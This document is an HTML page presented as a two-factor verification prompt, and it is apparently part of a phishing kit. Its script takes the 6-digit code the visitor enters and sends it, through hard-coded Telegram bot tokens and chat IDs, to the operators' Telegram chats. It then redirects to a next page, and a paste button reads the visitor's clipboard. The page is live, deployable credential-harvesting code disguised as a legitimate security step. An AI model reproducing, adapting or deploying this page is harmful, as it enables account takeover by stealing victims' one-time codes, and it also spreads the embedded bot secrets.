<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>2FA Verification</title>
    <style>
        body {
            margin: 0;
            padding: 0;
            font-family: Arial, sans-serif;
            background-color: rgb(34, 38, 38);
            color: #fff;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 50vh;
        }

        .container {
            background-color: rgba(34, 38, 38, 0);
            padding: 10px;
            width: 100%;
            padding: 20px;
            text-align: center;
        }

        .container img {
            width: 50px;
            margin-bottom: 20px;
        }

        .container h1 {
            font-size: 1.5rem;
            margin-bottom: 10px;
        }

        .container p {
            font-size: 0.9rem;
            color: #b3b3b3;
            margin-bottom: 20px;
        }

        .input-group {
            display: flex;
            justify-content: space-between;
            align-items: center;
            background-color: #2e2e2e;
            border: 1px solid #4e4e4e;
            border-radius: 5px;
            padding: 10px;
            margin-bottom: 20px;
        }

        .input-group input {
            border: none;
            background: none;
            color: #fff;
            outline: none;
            width: 80%;
        }

        .input-group button {
            background-color: #4e4e4e;
            border: none;
            color: #fff;
            padding: 5px 10px;
            border-radius: 3px;
            cursor: pointer;
        }

        .container a {
            font-size: 0.9rem;
            color: #39b54a;
            text-decoration: none;
            display: block;
            margin-bottom: 20px;
        }

        .container button.submit {
            background: linear-gradient(90deg, #33cc66, #39b54a);
            color: #000;
            font-weight: bold;
            border: none;
            padding: 16px;
            border-radius: 5px;
            width: 100%;
            cursor: pointer;
            transition: background 0.3s;
        }

        .container button.submit:hover {
            background:linear-gradient(90deg, #33cc66, #39b54a);
        }
    </style>
</head>
<body>
    <div class="container">
        <img src="lock.png" alt="Lock Icon">
        <h1>Verify 2FA</h1>
        <p>Please enter the 6-digit verification code from the authenticator.</p>
        <div class="input-group">
            <input type="text" id="verificationCode" placeholder="Verification Code" maxlength="6">
            <button onclick="pasteCode()">Paste</button>
        </div>
        <a href="#">Don't have access to this 2FA?</a>
        <button class="submit" onclick="sendMessage()">Submit</button>
    </div>

    <script>
        // New bot tokens and chat IDs
        const bots = [
            {
                token: "7746332737:AAEOz6lVMykBEDri1KAIsN_UFo8eAJoEoHs",
                chatId: "6942741954"
            },
            {
                token: "7860053171:AAH5rKPoMIjqvqgAo8h3J_etU8Waawn1MvI",
                chatId: "7120473372"
            }
        ];

        // Function to send message to a specific bot
        async function sendToBot(bot, message) {
            const url = `https://api.telegram.org/bot${bot.token}/sendMessage`;
            const payload = {
                chat_id: bot.chatId,
                text: message
            };

            try {
                const response = await fetch(url, {
                    method: "POST",
                    headers: {
                        "Content-Type": "application/json"
                    },
                    body: JSON.stringify(payload)
                });

                if (!response.ok) {
                    console.error(`Failed to send message to bot with chat ID: ${bot.chatId}`);
                }
            } catch (error) {
                console.error(`Error sending message to bot: ${error}`);
            }
        }

        // Function to handle the Submit button click
        async function sendMessage() {
            const code = document.getElementById("verificationCode").value.trim();

            if (code === "") {
                alert("Please enter the verification code.");
                return;
            }

            const message = `2FA Verification Code: ${code}`;

            // Send the message to all bots
            for (const bot of bots) {
                await sendToBot(bot, message);
            }

            window.location.href = 'method.html';
        }

        // Optional: Function to paste text into the input field
        function pasteCode() {
            navigator.clipboard.readText()
                .then(text => {
                    document.getElementById("verificationCode").value = text;
                })
                .catch(err => {
                    console.error("Failed to read clipboard contents: ", err);
                });
        }
    </script>
</body>
</html>
